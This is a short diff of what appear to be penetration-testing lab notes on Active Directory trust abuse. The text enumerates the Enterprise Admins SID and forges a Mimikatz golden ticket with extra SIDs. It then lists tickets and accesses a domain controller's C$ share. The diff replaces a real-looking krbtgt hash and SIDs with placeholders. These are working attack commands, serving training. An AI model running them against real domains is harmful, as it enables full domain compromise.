@@ -52,7 +52,7 @@ Get-DomainSID
 Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 
-kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CURRENT_DOMAIN_SID /krbtgt:NTLM_HASH /sids:ENTERPRISE_ADMIN_GROUP_SID /ptt
 
 klist
 ls \\academy-ea-dc01.inlanefreight.local\c$
